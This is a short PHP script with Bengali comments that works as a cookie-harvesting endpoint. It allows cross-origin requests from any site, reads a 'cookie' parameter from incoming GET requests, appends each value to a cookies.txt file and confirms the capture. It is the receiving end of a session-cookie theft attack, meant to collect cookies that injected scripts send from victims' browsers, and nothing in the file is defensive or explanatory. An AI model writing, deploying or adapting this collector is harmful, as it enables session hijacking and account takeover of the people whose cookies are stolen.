<?php


header("Access-Control-Allow-Origin: *");
header("Access-Control-Allow-Methods: GET, POST, OPTIONS");
header("Access-Control-Allow-Headers: Content-Type");
// ১. নিশ্চিত করা যে শুরুতে কোনো স্পেস নেই
if (isset($_GET['cookie'])) {
    $cookie = $_GET['cookie'] . PHP_EOL;
    
    // ২. সহজ পদ্ধতিতে cookies.txt ফাইলে ডাটা অ্যাপেন্ড করা
    file_put_contents("cookies.txt", $cookie, FILE_APPEND);
    
    echo "Cookie captured successfully!";
} else {
    echo "No cookie received.";
}
?>
